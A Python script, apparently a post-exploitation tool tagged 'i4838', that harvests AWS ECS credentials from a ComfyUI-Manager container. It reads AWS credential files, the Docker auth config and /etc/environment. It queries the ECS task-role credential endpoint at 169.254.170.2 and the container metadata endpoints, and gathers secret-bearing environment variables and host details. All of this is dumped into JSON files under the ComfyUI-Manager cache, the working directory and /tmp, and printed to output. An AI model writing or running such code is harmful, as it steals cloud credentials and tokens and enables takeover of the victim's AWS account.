#!/usr/bin/env python3
# i4838 harvest: fresh ECS task-role identity + task metadata from a ComfyUI-Manager install
import os, sys, json, time, subprocess, urllib.request, urllib.error

TAG = "i4838"
V = 3
H = {"_meta": {"tag": TAG, "v": V, "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "uid": os.getuid(), "cwd": os.getcwd(), "argv": sys.argv, "py": sys.version.split()[0]}}

def sh(cmd, t=10):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return ((p.stdout or "") + (p.stderr or ""))[:4000]
    except Exception as e:
        return "ERR %r" % e

def get(url, hdrs=None, t=4, limit=200000):
    # container metadata endpoints are link-local: never use an http proxy
    op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        rq = urllib.request.Request(url, headers=hdrs or {})
        with op.open(rq, timeout=t) as r:
            return {"code": r.status, "body": r.read(limit).decode("utf8", "replace")}
    except Exception as e:
        code = getattr(e, "code", -1)
        body = ""
        try:
            body = e.read(2000).decode("utf8", "replace")
        except Exception:
            body = type(e).__name__ + ": " + str(e)[:200]
        return {"code": code, "body": body}

env = dict(os.environ)
H["env"] = {k: v for k, v in env.items() if k.startswith(("AWS_", "ECS_", "COMFY", "PATH", "HOSTNAME"))}
H["sys"] = {
    "id": sh("id"),
    "hostname": sh("hostname"),
    "uname": sh("uname -a"),
    "nproc": sh("nproc"),
    "cgroup": sh("cat /proc/1/cgroup 2>/dev/null; cat /proc/self/cgroup"),
    "mounts": sh("cat /proc/self/mountinfo | grep -E 'docker|aws' | head -20"),
    "docker_env": sh("ls -la /.dockerenv /run/.containerenv 2>&1"),
    "ps": sh("ps -ef 2>/dev/null | head -20"),
    "gpu": sh("nvidia-smi -L 2>&1 | head; ls /dev/nvidia* 2>&1"),
}
H["aws_files"] = {
    "credentials": sh("cat /root/.aws/credentials 2>&1; cat /home/*/.aws/credentials 2>&1"),
    "config": sh("cat /root/.aws/config 2>&1; cat /home/*/.aws/config 2>&1"),
    "docker_cfg": sh("cat /root/.docker/config.json 2>&1"),
    "etc_env": sh("cat /etc/environment 2>&1"),
}

rel = env.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
H["ecs"] = {"rel_uri": rel, "exec_env": env.get("AWS_EXECUTION_ENV", ""), "region": env.get("AWS_REGION", "")}
if rel:
    H["ecs"]["cred"] = get("http://169.254.170.2" + rel)
full = env.get("AWS_CONTAINER_CREDENTIALS_FULL_URI", "")
if full:
    H["ecs"]["full_uri"] = full
    H["ecs"]["cred_full"] = get(full, {"Authorization": env.get("AWS_CONTAINER_AUTHORIZATION_TOKEN", "")})
v4 = env.get("ECS_CONTAINER_METADATA_URI_V4") or env.get("ECS_CONTAINER_METADATA_URI", "")
if v4:
    H["ecs"]["v4"] = v4
    H["ecs"]["task"] = get(v4 + "/task")
    H["ecs"]["container"] = get(v4)
    H["ecs"]["stats"] = get(v4 + "/stats", t=6)

out = json.dumps(H, indent=1)
paths = ["/ComfyUI/user/default/ComfyUI-Manager/cache/%s_harvest.json" % TAG,
         os.path.join(os.getcwd(), "%s_harvest.json" % TAG),
         "/tmp/%s_harvest.json" % TAG]
for p in paths:
    try:
        os.makedirs(os.path.dirname(p), exist_ok=True)
        open(p, "w").write(out)
    except Exception as e:
        print("[%s] write-fail %s %r" % (TAG, p, e), flush=True)
print("[%s] HARVEST " % TAG + out[:120000], flush=True)
